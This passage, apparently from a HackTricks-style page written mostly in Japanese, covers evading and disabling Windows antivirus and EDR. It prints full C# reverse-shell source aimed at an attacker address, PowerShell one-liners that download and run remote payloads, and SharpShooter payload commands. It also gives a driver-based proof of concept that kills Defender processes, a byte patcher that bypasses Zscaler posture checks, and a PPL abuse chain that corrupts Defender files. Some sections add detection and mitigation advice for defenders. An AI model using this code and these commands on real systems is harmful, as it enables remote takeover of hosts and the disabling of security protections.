**現在の defender はプロセスを非常に速く終了させます。**

### 独自の reverse shell をコンパイルする

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

以下のコマンドでコンパイルします:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
次のように使用します:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# コンパイラの使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# の難読化ツール一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### インジェクターをビルドするための Python の例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間から AV/EDR を停止する

Storm-2603 は小さなコンソールユーティリティである **Antivirus Terminator** を利用して、ランサムウェアを展開する前にエンドポイント保護を無効化しました。このツールは **独自の脆弱だが *署名済み* のドライバ** を持ち込み、それを悪用して Protected-Process-Light (PPL) な AV サービスでもブロックできない特権カーネル操作を実行します。

Key take-aways
1. **Signed driver**: ディスクに配布されたファイルは `ServiceMouse.sys` ですが、バイナリは Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正当に署名されたドライバ `AToolsKrnl64.sys` です。ドライバが有効な Microsoft 署名を持っているため、Driver-Signature-Enforcement (DSE) が有効でもロードされます。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
最初の行はドライバを **kernel service** として登録し、2行目はそれを起動するため、`\\.\ServiceMouse` がユーザ空間からアクセス可能になります。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 任意の PID のプロセスを終了する（Defender/EDR サービスを停止するために使用される） |
| `0x990000D0` | 任意のファイルをディスク上から削除する |
| `0x990001D0` | ドライバをアンロードし、サービスを削除する |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD はユーザモードの保護を完全に回避します。カーネルで実行されるコードは *protected* プロセスを開いたり終了させたり、PPL/PP、ELAM やその他のハードニング機能に関係なくカーネルオブジェクトを改変できます。

Detection / Mitigation
• Microsoft の vulnerable-driver ブロックリスト（`HVCI`, `Smart App Control`）を有効にして、Windows が `AToolsKrnl64.sys` のロードを拒否するようにする。  
• 新しい *kernel* サービスの作成を監視し、ワールドライト可能なディレクトリからドライバがロードされた場合や許可リストにないドライバがロードされた場合にアラートを出す。  
• カスタムデバイスオブジェクトへのユーザモードハンドル生成のあとに疑わしい `DeviceIoControl` 呼び出しが続くパターンを監視する。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler の **Client Connector** はデバイスポスチャルールをローカルで適用し、結果を他のコンポーネントへ伝えるために Windows RPC を使用します。設計上の弱点が二つあり、完全なバイパスが可能になります：

1. Posture の評価は **完全にクライアント側で行われる**（サーバへはブール値が送られるだけ）。  
2. 内部の RPC エンドポイントは接続する実行ファイルが **Zscaler によって署名されている** ことだけを検証する（`WinVerifyTrust` を経由）。

これら二つの仕組みは、ディスク上の署名済みバイナリを **4つパッチ** することで無効化できます：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すようにされ、すべてのチェックが準拠と判定される |
| `ZSAService.exe` | 間接的に `WinVerifyTrust` を呼ぶ | NOP 化 ⇒ 任意の（未署名のものさえ含む）プロセスが RPC パイプにバインドできる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置換される |
| `ZSATunnel.exe` | トンネル上の整合性チェック | ショートサーキットされる（処理が回避される） |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

This case study demonstrates how purely client-side trust decisions and simple signature checks can be defeated with a few byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforces a signer/level hierarchy so that only equal-or-higher protected processes can tamper with each other. Offensively, if you can legitimately launch a PPL-enabled binary and control its arguments, you can convert benign functionality (e.g., logging) into a constrained, PPL-backed write primitive against protected directories used by AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN プリミティブ: ClipUp.exe
- 署名済みのシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自身でプロセスを生成し、呼び出し側が指定したパスにログファイルを書き込むパラメータを受け取ります。
- PPL プロセスとして起動すると、ファイル書き込みは PPL の保護下で実行されます。
- ClipUp はスペースを含むパスを解析できません。通常保護された場所を指すには 8.3 の短縮パスを使用してください。

8.3 短縮パス ヘルパー
- 短縮名の一覧表示: `dir /x` を各親ディレクトリで実行。
- cmd で短縮パスを導出: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain（概要）
1) PPL 対応の LOLBIN（ClipUp）をランチャー（例: CreateProcessAsPPL）で `CREATE_PROTECTED_PROCESS` を指定して起動する。
2) ClipUp のログパス引数を渡して、保護された AV ディレクトリ（例: Defender Platform）にファイル作成を強制する。必要なら 8.3 短縮名を使用する。
3) ターゲットのバイナリが通常 AV によって実行中に開かれている/ロックされている場合（例: MsMpEng.exe）、AV が起動する前のブート時に書き込みが行われるよう、より早く確実に実行される自動起動サービスをインストールしてスケジュールする。ブート順序は Process Monitor（boot logging）で検証する。
4) 再起動時に PPL 保護下の書き込みが AV がバイナリをロックする前に行われ、ターゲットファイルが破損して起動不能となる。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意点と制約
- ClipUp が書き込む内容は配置以外で制御できない; このプリミティブは正確なコンテンツ注入というより破損（corruption）向けである。
- サービスをインストール/起動するためにローカル管理者/SYSTEM 権限と再起動のタイミングが必要。
- タイミングが重要：対象が開かれていない必要がある。ブート時実行はファイルロックを回避する。

検出
- ブート前後に、異常な引数で起動された `ClipUp.exe` のプロセス生成（特に非標準ランチャーを親に持つもの）を監視。
- 自動起動に設定された疑わしいバイナリを指す新しいサービスが作成され、常に Defender/AV より先に起動している場合。Defender 起動失敗の前にサービス作成／変更を調査すること。
- Defender バイナリ／Platform ディレクトリに対するファイル整合性監視。protected-process フラグを持つプロセスによる予期しないファイル生成／変更を確認。
- ETW/EDR テレメトリ：`CREATE_PROTECTED_PROCESS` で生成されたプロセスや、非-AV バイナリによる異常な PPL レベルの使用を監視。

緩和策
- WDAC/Code Integrity：どの署名済みバイナリが PPL として、どの親プロセス下で実行可能かを制限する。正当なコンテキスト外での ClipUp 呼び出しをブロック。
- サービス管理：自動起動サービスの作成／変更を制限し、起動順序の操作を監視。
- Defender の tamper protection と early-launch 保護を有効にする。バイナリ破損を示す起動エラーは調査すること。
- 環境が許すなら、セキュリティツールをホストするボリュームで 8.3 ショートネーム生成を無効化することを検討する（十分にテストすること）。

PPL とツール関連の参考
- Microsoft Protected Processes の概要: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU リファレンス: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon のブートログ（起動順序検証）: https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL ランチャー: https://github.com/2x7EQ13/CreateProcessAsPPL
- 技術解説（ClipUp + PPL + boot-order tamper）: https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
